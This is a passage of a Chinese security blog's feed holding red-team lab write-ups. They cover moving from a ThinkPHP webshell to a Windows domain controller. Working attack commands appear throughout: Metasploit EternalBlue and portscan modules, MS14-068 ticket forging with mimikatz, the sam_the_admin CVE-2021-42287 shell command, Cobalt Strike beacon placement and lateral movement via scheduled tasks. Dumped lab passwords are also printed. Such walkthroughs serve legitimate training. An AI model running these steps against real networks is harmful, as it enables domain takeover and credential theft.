192.168.157.129</span><br><span class="line">set lport 9091</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220116005002.png"></p><p>收到会话</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>发现第二个网段，192.168.183</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220116005302.png"></p><p>添加一个网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.183.0 255.255.255.0 2</span><br></pre></td></tr></table></figure><p>端口扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set rhosts 192.168.183.0&#x2F;24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220116010921.png"></p><p>扫出了192.168.183.131和192.168.183.137两个存活目标，且开放了445端口，尝试通过ms17010打</p><h3 id="MS-17-010"><a href="#MS-17-010" class="headerlink" title="MS-17-010"></a>MS-17-010</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue #攻击模块</span><br><span class="line">set rhost 192.168.183.135 #设置监听地址</span><br><span class="line">set lhost 192.168.183.131 #设置攻击目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220116011948.png"></p><p>一直没成功。。。。 每次打ms17010就跟博彩一样 害</p><p>既然是靶机，那我就投机取巧，直接在win7上上个马进行上线</p><h3 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h3><p>本地开启cs服务端</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220118011324.png"></p><p>此处省略一系列投机取巧的方法。。</p><p>Ding！</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220118014046.png"></p><h2 id="域内渗透"><a href="#域内渗透" class="headerlink" title="域内渗透"></a>域内渗透</h2><p>直接getsystem尝试提权，失败</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220118014136.png"></p><p>使用ms14-058提权，成功得到system权限</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220118014217.png"></p><p>查看当前所打补丁与该域信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">主机名:           TESTWIN7-PC</span><br><span class="line">OS 名称:          Microsoft Windows 7 企业版 </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          成员工作站</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     testwin7</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00392-918-5000002-85176</span><br><span class="line">初始安装日期:     2019&#x2F;12&#x2F;31, 10:38:42</span><br><span class="line">系统启动时间:     2022&#x2F;1&#x2F;18, 1:02:58</span><br><span class="line">系统制造商:       VMware, Inc.</span><br><span class="line">系统型号:         VMware Virtual Platform</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 1 个处理器。</span><br><span class="line">                  [01]: AMD64 Family 23 Model 96 Stepping 1 AuthenticAMD ~1796 Mhz</span><br><span class="line">BIOS 版本:        Phoenix Technologies LTD 6.00, 2020&#x2F;7&#x2F;22</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     2,047 MB</span><br><span class="line">可用的物理内存:   1,415 MB</span><br><span class="line">虚拟内存: 最大值: 4,095 MB</span><br><span class="line">虚拟内存: 可用:   3,297 MB</span><br><span class="line">虚拟内存: 使用中: 798 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               demo.com</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 37 个修补程序。</span><br><span class="line">                  [01]: KB2491683</span><br><span class="line">                  [02]: KB2534111</span><br><span class="line">                  [03]: KB2564958</span><br><span class="line">                  [04]: KB2621440</span><br><span class="line">                  [05]: KB2653956</span><br><span class="line">                  [06]: KB2654428</span><br><span class="line">                  [07]: KB2698365</span><br><span class="line">                  [08]: KB2705219</span><br><span class="line">                  [09]: KB2736422</span><br><span class="line">                  [10]: KB2813430</span><br><span class="line">                  [11]: KB2900986</span><br><span class="line">                  [12]: KB2937610</span><br><span class="line">                  [13]: KB2943357</span><br><span class="line">                  [14]: KB2978120</span><br><span class="line">                  [15]: KB2984972</span><br><span class="line">                  [16]: KB2992611</span><br><span class="line">                  [17]: KB2999226</span><br><span class="line">                  [18]: KB3004375</span><br><span class="line">                  [19]: KB3010788</span><br><span class="line">                  [20]: KB3023215</span><br><span class="line">                  [21]: KB3031432</span><br><span class="line">                  [22]: KB3035126</span><br><span class="line">                  [23]: KB3037574</span><br><span class="line">                  [24]: KB3045685</span><br><span class="line">                  [25]: KB3046269</span><br><span class="line">                  [26]: KB3072305</span><br><span class="line">                  [27]: KB3074543</span><br><span class="line">                  [28]: KB3086255</span><br><span class="line">                  [29]: KB3097989</span><br><span class="line">                  [30]: KB3101722</span><br><span class="line">                  [31]: KB3108371</span><br><span class="line">                  [32]: KB3122648</span><br><span class="line">                  [33]: KB3127220</span><br><span class="line">                  [34]: KB3155178</span><br><span class="line">                  [35]: KB4019990</span><br><span class="line">                  [36]: KB4040980</span><br><span class="line">                  [37]: KB976902</span><br><span class="line">网卡:             安装了 1 个 NIC。</span><br><span class="line">                  [01]: Intel(R) PRO&#x2F;1000 MT Network Connection</span><br><span class="line">                      连接名:      本地连接</span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line">                      DHCP 服务器: 192.168.183.254</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 192.168.183.138</span><br><span class="line">                        [02]: fe80::d5a8:ce39:2905:4aca</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>补丁未打ms14-068的，可以使用该漏洞直接拿下域管</p><p>抓取到该机器密码为Dotest123</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220118015116.png"></p><h3 id="MS14-068拿下域控"><a href="#MS14-068拿下域控" class="headerlink" title="MS14-068拿下域控"></a>MS14-068拿下域控</h3><p>获取到sid</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220118020951.png"></p><p>打开mimikatz，清除票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220118021317.png"></p><p>生成票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@demo.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.138 -p Dotest123</span><br></pre></td></tr></table></figure><p>注入票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc C:\Users\douser\Desktop\TGT_douser@demo.com.ccache</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220118022337.png"></p><p>最后使用计划任务或者直接cs里用跳板跳即可</p><p>就这样吧。。。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;ATT-amp-CK红队评估实战靶场四&quot;&gt;&lt;a href=&quot;#ATT-amp-CK红队评估实战靶场四&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK红队评估实战靶场四&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK红队评估实战</summary>
      
    
    
    
    <category term="-渗透" scheme="https://blog.abinix.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队评估实战靶场五</title>
    <link href="https://blog.abinix.top/2021/12/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%94/"/>
    <id>https://blog.abinix.top/2021/12/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%94/</id>
    <published>2021-12-23T16:30:47.000Z</published>
    <updated>2021-12-23T16:53:21.596Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场五"><a href="#ATT-amp-CK红队评估实战靶场五" class="headerlink" title="ATT&amp;CK红队评估实战靶场五"></a>ATT&amp;CK红队评估实战靶场五</h1><h2 id="靶场漏洞扫描"><a href="#靶场漏洞扫描" class="headerlink" title="靶场漏洞扫描"></a>靶场漏洞扫描</h2><p>拿到题目，可知这是thinkphp框架，历史有许多漏洞，这里使用gui工具进行漏洞扫描</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029135326.png"></p><p>扫出rce漏洞，可以进行getshell</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029135440.png"></p><p>一键getshell，懒得找poc了（菜）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029135538.png"></p><p>使用蚁剑连接</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029155149.png"></p><p>成功连上，进一步渗透，上线cs</p><h2 id="内网不出网机器上线"><a href="#内网不出网机器上线" class="headerlink" title="内网不出网机器上线"></a>内网不出网机器上线</h2><p>思考了一下，靶机搭在校园网内网，但cs是放在服务器上的，那么得想办法将本地代理出网，使得cs能上线</p><p><strong>思路：</strong>将本地ip出去，通过cs监听里的代理地址进行连接</p><ul><li>下载代理工具</li></ul><p><a href="https://github.com/snail007/goproxy/releases">https://github.com/snail007/goproxy/releases</a></p><p>使用命令 <code>./proxy http -t tcp -p :8888</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029132121.png"></p><p>如上图表示开启成功</p><ul><li><p>设置监听</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029135835.png"></p><p>add添加监听，http hosts就为服务器地址，下面设置代理</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224004221.png"></p></li><li><p>生成后门，注意这里后门需要选择带s的，不然无法上线</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224004304.png"></p><p>监听设为刚刚我们设置的t2</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029132447.png"></p></li><li><p>上传木马，并运行</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029140243.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029155130.png"></p></li><li><p>成功上线一台主机</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224004335.png"></p><h2 id="上线域控"><a href="#上线域控" class="headerlink" title="上线域控"></a>上线域控</h2></li><li><p>内网信息收集</p><p>命令：<code>logonpasswords</code> 抓取密码</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029132642.png"></p><p>​    命令：<code>shell ipconfig</code> 查看ip信息</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029141152.png"></p><p>​    命令：<code>portscan</code> 端口扫描，这里选择下面的，因为是内网环境</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029141231.png"></p><ul><li><p>发现内网内存在两台机器，那么可以利用已经上线的机器作为跳板机，进行进一步渗透</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029144802.png"></p></li><li><p>设置新的监听，跳板机</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029155113.png"></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029145206.png"></p><ul><li><p>跳板操作</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029155058.png"></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029145342.png"></p><ul><li><p>成功上线两台机子</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029145855.png"></p></li></ul><h2 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h2><p>开启RDP（这台靶机默认打开）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029155938.png"></p><p>电脑远程桌面连接</p><p>注意：这里用户名是域\用户，所以是<strong>sun\Administrator</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211029161232.png"></p><p>连接成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ATT-amp-CK红队评估实战靶场五&quot;&gt;&lt;a href=&quot;#ATT-amp-CK红队评估实战靶场五&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK红队评估实战靶场五&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK红队评估实战靶场五&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="-渗透" scheme="https://blog.abinix.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>从外网Thinkphp打入并拿下域控</title>
    <link href="https://blog.abinix.top/2021/12/23/%E4%BB%8E%E5%A4%96%E7%BD%91Thinkphp%E6%89%93%E5%85%A5%E5%B9%B6%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/"/>
    <id>https://blog.abinix.top/2021/12/23/%E4%BB%8E%E5%A4%96%E7%BD%91Thinkphp%E6%89%93%E5%85%A5%E5%B9%B6%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/</id>
    <published>2021-12-23T15:29:36.000Z</published>
    <updated>2021-12-23T15:36:37.589Z</updated>
    
    <content type="html"><![CDATA[<h1 id="靶标渗透"><a href="#靶标渗透" class="headerlink" title="靶标渗透"></a>靶标渗透</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>cd到目录下：C:\Windows\System32\drivers\etc\</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202103803.png"></p><p>修改hosts文件</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202103835.png"></p><p>为ip添加host</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>nmap查看开放端口</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202104418.png"></p><p>​    开了3306，3389</p><ul><li><p>查看框架得知是thinkphp</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202104609.png"></p></li><li><p>使用工具扫出日志泄露</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202104855.png"></p></li></ul><p><strong>遍历</strong>日期来获取日志，<a href="https://gitee.com/keyboxdzd/TPLogScan">https://gitee.com/keyboxdzd/TPLogScan</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202152644.png"></p><p><code> python TPLogScan.py -u http://www.webhack123.com//App/ -v 3 -p /Runtime/Logs/ -m 7 -d 1</code>获取7月到现在的日志信息</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202152608.png"></p><h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><ul><li><p>经过大量日志审计后最终在9.30号发现了端倪，有usernam和passwod</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202153028.png"></p></li></ul><p>​    获取到了管理员的账号密码</p><ul><li><p>md5解密后得到</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202153112.png"></p></li><li><p>登陆后台</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202155437.png"></p></li></ul><p>​    在系统设置中发现有文件上传的地方</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202155610.png"></p><ul><li><p>尝试上传一句话，观察到可以添加文件类型，果断添加jsp</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202190604.png"></p></li></ul><p>​    点击提交</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202190844.png"></p><p>​    查看图片上传地址</p><p>​    得到页面<a href="http://www.webhack123.com/index.php/Page/about.shtml">http://www.webhack123.com/index.php/Page/about.shtml</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202191420.png"></p><p>但发现打开页面并未解析，冰蝎连不上，溯决定上传php，（做到下一步才猛然想到网站是php写的，jsp连**，直接用php的冰蝎马不就好了，还是太菜了）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202193404.png"></p><p>使用php上传</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202193313.png"></p><p>蚁剑连接成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202193443.png"></p><ul><li><p>得到webshell后在蚁剑逛了一逛，发现了一大堆奇奇怪怪的，<strong>也是怕马子被别人删</strong>，找到了一处别人上传过php的冰蝎马，</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202192652.png"></p></li></ul><p>​    密码不是初始密码，拿去md5解密一下，得到密码yc</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202192748.png"></p><p>​    成功连上冰蝎(别人的🐎)</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202192810.png"></p><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>查看权限，为管理员权限</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202195732.png"></p><ul><li><p>查看基本系统信息 命令：<strong>systeminfo</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202200024.png"></p><p>为2008的机器，并且就两个补丁，啊这，<strong>并且存在域环境</strong></p></li><li><p>查看杀软，命令：<strong>tasklist /svc</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211202195900.png"></p><p>无杀软，很惊喜</p></li><li><p>有两张网卡</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211207131258.png"></p></li></ul><h2 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h2><p>这里弄了半天，因为内网不出网，并且物理机连着vpn，所以打算虚拟机开启cs，物理机开启一个frp服务端，kali作为客户端，进行上线</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215083902.png"></p><p>将虚拟机的4567端口转发到本机vpn的46898端口，添加监听，一一对应即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215084150.png"></p><p>使用powershell上线</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215084235.png"></p><p>第一台web机上线成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215084251.png"></p><h2 id="内网信息收集-1"><a href="#内网信息收集-1" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><ul><li>mimikatz抓密码</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215084609.png"></p><p>抓取到web用户密码为**!@#Qwe456**，因为有域环境，猜测密码与DC不会一致</p><p>Administrator密码为<strong>T1//@1607#@</strong></p><ul><li>端口扫描</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215085054.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215090141.png"></p><ul><li><p>查看域内用户 <code>net view /domain:hackbox</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215090517.png"></p></li><li><p>查看补丁 <code>systeminfo</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215092010.png"></p><ul><li><p>查看域控 地址</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215094633.png"></p><p>地址为<strong>192.168.150.254</strong></p></li></ul><p>拿到<a href="https://i.hacking8.com/tiquan%E4%B8%8A%E6%9F%A5%E4%B8%80%E4%B8%8B%E5%93%AA%E4%BA%9B%E8%A1%A5%E4%B8%81%E6%98%AF%E9%81%97%E6%BC%8F%E7%9A%84">https://i.hacking8.com/tiquan上查一下哪些补丁是遗漏的</a></p><p>网上搜索找到一个洞可以将普通域用户提升到域控的漏洞 <strong>MS14-068（未打补丁KB3011780）</strong></p><h2 id="漏洞利用（方法一）"><a href="#漏洞利用（方法一）" class="headerlink" title="漏洞利用（方法一）"></a>漏洞利用（方法一）</h2><p>远程连接</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215084901.png"></p><p>发现这么连接并不成功，登不进域内，那就登陆工作组</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215085611.png"></p><p>登陆成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215085917.png"></p><p>Ms14-068.exe 下载地址: <a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><p>将poc上传至目标服务器</p><ul><li><p>访问DC共享文件夹</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215093352.png"></p></li><li><p>获取用户sid：<code>whoami /user</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215184906.png"></p><ul><li><p>利用ms14-068.exe提权工具生成伪造的kerberos协议认证证书</p><p><strong>sid不能弄错，注意用户</strong></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u web@hackbox.com -p !@#Qwe456 -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 192.168.150.254</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215095104.png"></p><p>生成票据:<img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215095129.png"></p><ul><li><p>使用mimikatz攻击</p><p><code>mimikatz.exe</code></p></li><li><p>清除目标内存中的所有票据</p><p>命令：<code>kerberos::purge</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215095401.png"></p><ul><li>将票据注入到目标内存</li></ul><p>​    命令：<code>kerberos::ptc 票据</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215095624.png"></p><ul><li><p>查看当前票据</p><p>命令：<code>kerberos::list</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215095747.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215102303.png"></p><p>存在域管票据</p><ul><li><p>登陆远程文件夹成功，成功拿下dc</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211215103437.png"></p></li></ul><h2 id="漏洞利用（方法二）"><a href="#漏洞利用（方法二）" class="headerlink" title="漏洞利用（方法二）"></a>漏洞利用（方法二）</h2><p>使用最新的漏洞<strong>CVE-2021-42287</strong>，只需一个域用户可直接提升至域管权限</p><p>漏洞分析链接：<a href="https://mp.weixin.qq.com/s/RvOndF3gdEZbgqrIPqXsUg">https://mp.weixin.qq.com/s/RvOndF3gdEZbgqrIPqXsUg</a></p><p>漏洞利用脚本：<a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><p>先使用sock代理，代理出来方便执行python</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211218004958.png"></p><p>命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 sam_the_admin.py &#39;hackbox&#x2F;WEB:!@#Qwe456&#39; -dc-ip 192.168.150.254 -shell</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211218010241.png"></p><p>​    等待一会即可得到回弹shell</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211218130008.png"></p><p>​    域管权限</p><h2 id="上线域管"><a href="#上线域管" class="headerlink" title="上线域管"></a>上线域管</h2><ul><li><p>准备上线域控，因为域控192开头，内网不出网，我觉得采用<strong>正向连接</strong>，创建一个smb监听，然后主动去连接DC机</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211217223528.png"></p><p><em>（后来看了别的佬的WP后猛然想到反向连接也是可以的，之前这里没成功，原因是host搞错了，新的监听ip应该是192.168.150.6，而不是172.16.150.6，因为192和DC相通，唉，所以说渗透测试思路很重要呀！）</em></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211218132242.png"></p></li><li><p>使用copy命令上传至dc机器中</p><p><code>copy 9.exe \\\dc\c$</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211217223619.png"></p></li><li><p>at计划任务获取shell</p><p>使用命令<code>net time \\dc</code>查看当前机器时间，并使用at定时一个命令，我们让9.exe执行即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211217223800.png"></p></li></ul><p>​    添加成功，等到34分即可执行exe</p><ul><li><p>使用命令 <strong>lind dc</strong> 连接DC（因为是<strong>正向</strong>）</p><p>观察cs，等待上线</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211217223834.png"></p></li></ul><p>​    成功上线域管</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211217232145.png"></p><ul><li><p>抓取密码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211217224432.png"></p></li></ul><p>​    这边好像没有抓到明文密码。。。。</p><ul><li><p>决定添加一个用户上去看一下</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211217235450.png"></p></li></ul><p>​    拉倒</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;靶标渗透&quot;&gt;&lt;a href=&quot;#靶标渗透&quot; class=&quot;headerlink&quot; title=&quot;靶标渗透&quot;&gt;&lt;/a&gt;靶标渗透&lt;/h1&gt;&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="-渗透" scheme="https://blog.abinix.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透" scheme="https://blog.abinix.top/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队评估实战靶场一</title>
    <link href="https://blog.abinix.top/2021/12/23/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%80/"/>
    <id>https://blog.abinix.top/2021/12/23/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%80/</id>
